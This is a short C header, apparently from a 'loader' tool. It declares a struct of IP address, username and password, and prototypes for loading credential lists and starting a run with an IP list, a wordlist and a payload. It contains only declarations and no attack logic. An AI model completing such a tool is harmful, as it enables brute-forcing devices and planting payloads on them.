#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma once


/*
    *    util/loader/includes/parser/read.h
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


unsigned int f_len = 0;

struct l_list {
    char ipaddr[64];
    char username[64];
    char password[64];
};

void r_file(char *filename);
void i_file(char *filename, struct l_list *l_struct[f_len]);
void p_start(char *flag, char *i_list, char *wordlist, char *payload);
void load_credentials(char *filename, struct l_list *l_struct[f_len]);